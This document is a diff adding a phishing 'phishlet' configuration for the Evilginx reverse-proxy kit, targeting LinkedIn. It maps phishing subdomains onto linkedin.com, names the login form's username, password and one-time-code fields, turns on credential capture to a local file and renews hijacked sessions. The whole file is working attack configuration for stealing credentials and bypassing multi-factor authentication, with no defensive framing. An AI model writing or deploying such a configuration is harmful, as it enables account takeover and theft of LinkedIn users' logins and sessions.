@@ -1,0 +1,22 @@
+name: linkedin
+author: EvilGinx2 Team
+version: 1.0
+description: LinkedIn phishing phishlet
+
+proxy_hosts:
+  - {phish_sub: auth, orig_sub: www, domain: linkedin.com, session: true, is_landing: false}
+  - {phish_sub: static, orig_sub: static, domain: linkedin.com, session: false, is_landing: false}
+
+login:
+  paths: [/uas/login]
+  username_field: session_key
+  password_field: session_password
+  mfa_field: session_otp
+
+credentials:
+  capture: true
+  store: /var/lib/evilginx/credentials/linkedin_creds.jsonl
+
+session:
+  lifetime: 3600
+  renew: true
